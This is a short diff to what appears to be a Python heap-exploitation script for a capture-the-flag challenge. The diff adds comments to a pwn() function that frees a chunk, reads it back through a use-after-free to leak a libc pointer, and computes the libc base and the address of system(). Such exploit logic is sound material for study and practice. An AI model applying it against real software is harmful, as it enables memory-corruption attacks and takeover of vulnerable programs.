@@ -47,12 +47,15 @@ def edit(idx, size, data):
     return
 
 def pwn():
-
+    
+    # allocate small chunks in order for them to get populated
+    # with pointers to libc once they are free'd
     alloc(0x80, 'A'*10) # chunk 1
     alloc(0x80, 'B'*10) # chunk 2
 
     free(0)
-
+    
+    # UAF
     leak        = dump(0)
     libc        = leak - 0x3c4b78
     system      = libc + sys_off
